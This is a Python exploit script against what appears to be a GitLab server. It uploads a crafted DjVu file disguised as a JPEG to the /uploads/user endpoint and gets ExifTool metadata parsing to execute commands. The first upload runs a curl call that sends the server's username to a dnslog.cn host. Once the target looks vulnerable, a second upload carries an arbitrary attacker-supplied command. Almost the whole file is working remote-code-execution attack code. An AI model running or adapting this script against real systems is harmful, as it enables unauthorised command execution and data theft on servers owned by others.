import requests
from bs4 import BeautifulSoup
import base64
import random
import sys
import os
import argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


requests.packages.urllib3.disable_warnings()


target_url = sys.argv[1]
command = sys.argv[2]
prepend = b'\x41\x54\x26\x54\x46\x4F\x52\x4D\x00\x00\x03\xAF\x44\x4A\x56\x4D\x44\x49\x52\x4D\x00\x00\x00\x2E\x81\x00\x02\x00\x00\x00\x46\x00\x00\x00\xAC\xFF\xFF\xDE\xBF\x99\x20\x21\xC8\x91\x4E\xEB\x0C\x07\x1F\xD2\xDA\x88\xE8\x6B\xE6\x44\x0F\x2C\x71\x02\xEE\x49\xD3\x6E\x95\xBD\xA2\xC3\x22\x3F\x46\x4F\x52\x4D\x00\x00\x00\x5E\x44\x4A\x56\x55\x49\x4E\x46\x4F\x00\x00\x00\x0A\x00\x08\x00\x08\x18\x00\x64\x00\x16\x00\x49\x4E\x43\x4C\x00\x00\x00\x0F\x73\x68\x61\x72\x65\x64\x5F\x61\x6E\x6E\x6F\x2E\x69\x66\x66\x00\x42\x47\x34\x34\x00\x00\x00\x11\x00\x4A\x01\x02\x00\x08\x00\x08\x8A\xE6\xE1\xB1\x37\xD9\x7F\x2A\x89\x00\x42\x47\x34\x34\x00\x00\x00\x04\x01\x0F\xF9\x9F\x42\x47\x34\x34\x00\x00\x00\x02\x02\x0A\x46\x4F\x52\x4D\x00\x00\x03\x07\x44\x4A\x56\x49\x41\x4E\x54\x61\x00\x00\x01\x50\x28\x6D\x65\x74\x61\x64\x61\x74\x61\x0A\x09\x28\x43\x6F\x70\x79\x72\x69\x67\x68\x74\x20\x22\x5C\x0A\x22\x20\x2E\x20\x71\x78\x7B'
append = b'\x7D\x20\x2E\x20\x5C\x0A\x22\x20\x62\x20\x22\x29\x20\x29\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0A'

def check():
    session = requests.Session()
    try:
        #target_url="http://%s:%s/"% (host,sport)
        #print(target_url)
        req1 = session.get(target_url.strip("/") + "/users/sign_in", verify=False)
        soup = BeautifulSoup(req1.text, features="lxml")
        token = soup.findAll('meta')[16].get("content")
        print(token)
        data = "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{curl `whoami`.82sm53.dnslog.cn} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
            "Connection": "close",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5",
            "X-CSRF-Token": token, "Accept-Encoding": "gzip, deflate"}
        flag = 'Failed to process image'
        req2 = session.post(target_url.strip("/") + "/uploads/user", data=data, headers=headers, verify=False)
        if flag in req2.text:
            print("[+] 目标 {} 存在漏洞".format(target_url))
            files = [('file', ('test.jpg', prepend + command.encode() + append, 'image/jpeg'))]
            session.post(f'{target_url}/uploads/user', files=files, headers={'X-CSRF-Token': token})
            print("test complete!")
        else:
            print("[-] 目标 {} 不存在漏洞".format(target_url))
    except Exception as e:
        print(e)

    
if __name__ == '__main__':
    check()

    